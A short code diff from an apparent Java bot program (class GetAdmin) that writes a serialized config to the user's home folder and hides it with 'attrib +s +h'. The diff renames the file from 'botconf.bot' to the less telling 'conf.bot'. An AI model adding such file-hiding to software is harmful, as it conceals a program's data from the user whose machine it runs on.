@@ -64,7 +64,7 @@ public class GetAdmin extends Application {
             closing = true;
             primaryStage.close();
             try {
-                FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\botconf.bot");
+                FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\conf.bot");
                 ObjectOutputStream oos = new ObjectOutputStream(fos);
                 oos.writeObject(config);
                 oos.close();
@@ -72,7 +72,7 @@ public class GetAdmin extends Application {
                 sup.close();
                 Thread.sleep(1000);
                 try {
-                    Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\botconf.bot" + "\"");
+                    Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\conf.bot" + "\"");
                 } catch (IOException ek) {
                     System.out.println(ek + " HIDE");
                 }
